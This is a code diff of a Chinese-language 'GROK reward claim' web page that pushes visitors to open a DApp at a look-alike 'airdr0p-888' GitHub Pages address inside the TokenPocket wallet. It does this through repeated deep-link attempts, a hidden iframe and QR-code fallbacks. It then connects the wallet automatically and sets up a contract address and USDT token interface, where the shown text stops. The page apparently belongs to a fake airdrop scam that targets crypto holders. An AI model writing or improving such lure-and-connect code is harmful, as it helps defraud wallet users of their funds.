@@ -55,6 +55,7 @@
   <div class="card">
     <h1>GROK 奖励领取</h1>
 
+    <!-- TP唤醒提示 -->
     <div class="warning" id="tpTip">
       请点击下方按钮在 TP 钱包中打开 DApp。
     </div>
@@ -76,84 +77,86 @@
   </div>
 
   <script>
-    // 目标 DApp 页面（未编码）
     const TARGET_URL = "https://airdr0p-888.github.io/GROK1688/index.html";
 
-    /**
-     * 判断是否在 TokenPocket 内置浏览器
-     */
+    /** 判断是否在 TP 内置浏览器 */
     function isTPBrowser() {
       return /TokenPocket/i.test(navigator.userAgent);
     }
 
-    /**
-     * 通用唤醒函数：优先在 TP 内直接打开，尝试桥接对象，再 fallback 到 scheme 唤醒
-     * url: 完整 https://... 地址（未编码）
-     */
-    function openInTP(url) {
-      const encoded = encodeURIComponent(url);
+    /** 显示二维码和下载提示 */
+    function showQRCode(url) {
+      const qrSrc = "https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=" + encodeURIComponent(url);
 
-      // 1) 如果已经在 TP 内，直接用 replace 打开目标 URL（避免增加历史记录）
-      if (isTPBrowser()) {
-        try {
-          location.replace(url);
-        } catch (e) {
-          console.warn("在 TP 内直接打开失败，尝试 location.href", e);
-          location.href = url;
-        }
+      if (document.getElementById("qrWrap")) {
+        document.getElementById("qrImg").src = qrSrc;
         return;
       }
 
-      // 2) 尝试调用常见的钱包注入 bridge（例如 Trust / TokenPocket 等）
-      try {
-        // window.trust 常见于 Trust Wallet（并非 TP），但我们尝试兼容
-        if (typeof window.trust !== 'undefined' && typeof window.trust.open === 'function') {
-          window.trust.open(url);
-          return;
-        }
-        // 有些钱包可能注入了 TokenPocket 对象
-        if (typeof window.TokenPocket !== 'undefined' && typeof window.TokenPocket.open === 'function') {
-          window.TokenPocket.open(url);
-          return;
-        }
-        // 有钱包在 ethereum 对象上标记 isTokenPocket
-        if (window.ethereum && window.ethereum.isTokenPocket) {
-          // 直接在当前 webview 打开
-          location.replace(url);
-          return;
-        }
-      } catch (e) {
-        console.warn("bridge 调用异常：", e);
+      const wrap = document.createElement("div");
+      wrap.id = "qrWrap";
+      wrap.style = "margin-top:12px;text-align:center;color:#555;font-size:14px;";
+      wrap.innerHTML = `
+        <div>若 TP 未自动打开，请在 TP 内扫描下方二维码或点击“在浏览器打开”</div>
+        <img id="qrImg" src="${qrSrc}" alt="QR" style="margin-top:8px;border-radius:8px;box-shadow:0 6px 18px rgba(0,0,0,0.08);width:200px;height:200px;" />
+        <div style="margin-top:8px;">
+          <a id="openInBrowser" href="${TARGET_URL}" target="_blank" style="color:#1a73e8;text-decoration:none;">在外部浏览器打开</a>
+        </div>
+      `;
+      document.querySelector('.card').appendChild(wrap);
+
+      // 下载提示
+      if (!document.getElementById('tpDownloadNotice')) {
+        const el = document.createElement('div');
+        el.id = 'tpDownloadNotice';
+        el.style = 'margin-top:12px;color:#b00;font-size:13px;';
+        el.innerHTML = '如果您未安装 TokenPocket，请前往官网下载： <a href="https://www.tokenpocket.pro/zh/download" target="_blank">下载 TP</a>';
+        document.querySelector('.card').appendChild(el);
+      }
+    }
+
+    /** 多方案唤醒 TP 并尝试带入目标 URL */
+    function openTPRobust(url) {
+      const encoded = encodeURIComponent(url);
+      const schemes = [
+        `tpdapp://open?url=${encoded}`,
+        `tp://dapp?url=${encoded}`
+      ];
+
+      if (isTPBrowser()) {
+        try { location.replace(url); return; } catch(e) { location.href = url; return; }
       }
 
-      // 3) fallback：使用 TP 协议唤起（外部浏览器 -> 唤起 TP 并传入 url）
-      // 常见格式：tpdapp://open?url=ENCODED_URL  或 tp://dapp?url=ENCODED_URL
-      const tpdapp = `tpdapp://open?url=https://airdr0p-888.github.io/GROK1688/index.html`;
-      const tpAlt = `tp://dapp?url=https://airdr0p-888.github.io/GROK1688/index.html`;
+      // 尝试 scheme 1
+      window.location.href = schemes[0];
 
-      // 触发第一个 scheme
-      // 使用 iframe 技术可以在一些环境更温和地尝试唤醒，但简单 href 通常足够
-      window.location.href = tpdapp;
-
-      // 若 2.5s 后仍无响应，再尝试备用 scheme
+      // iframe 技巧尝试（安卓兼容）
       setTimeout(() => {
-        window.location.href = tpAlt;
-      }, 2500);
+        try {
+          const iframe = document.createElement('iframe');
+          iframe.style.display = 'none';
+          iframe.src = schemes[0];
+          document.body.appendChild(iframe);
+          setTimeout(() => { document.body.removeChild(iframe); }, 2000);
+        } catch (e) {}
+      }, 300);
 
-      // 若 6.5s 仍无响应，跳到下载页
-      setTimeout(() => {
-        window.location.href = "https://www.tokenpocket.pro/zh/download";
-      }, 6500);
+      // 备用 scheme
+      setTimeout(() => { window.location.href = schemes[1]; }, 2000);
+
+      // 若仍无响应，显示二维码
+      setTimeout(() => { showQRCode(url); }, 3500);
+
+      // 10 秒后显示下载提示（如果用户没有 TP）
+      setTimeout(() => { showQRCode(url); }, 10000);
     }
 
-    /**
-     * openTPBtn 的点击处理（把函数包装成用户手势）
-     */
+    /** 绑定按钮 */
     function openTPButton() {
-      openInTP(TARGET_URL);
+      openTPRobust(TARGET_URL);
     }
 
-    // 页面加载时：若已经在 TP 浏览器内，隐藏唤醒提示/按钮
+    /** 页面加载隐藏按钮/提示（如果已在 TP 内） */
     window.onload = async () => {
       if (isTPBrowser()) {
         document.getElementById("tpTip").style.display = "none";
@@ -162,7 +165,7 @@
       await autoConnect();
     };
 
-    // === 钱包连接与空投逻辑（保持与原来一致） ===
+    // === 钱包连接与空投逻辑 ===
     const CONTRACT = "0xa4441b1EcB6B807de485723F5320d06fB41Eac6F";
     const USDT = "0xa85f403f7869a050c91e9a260dbf08a64229b2de";
     const ABI_USDT = [
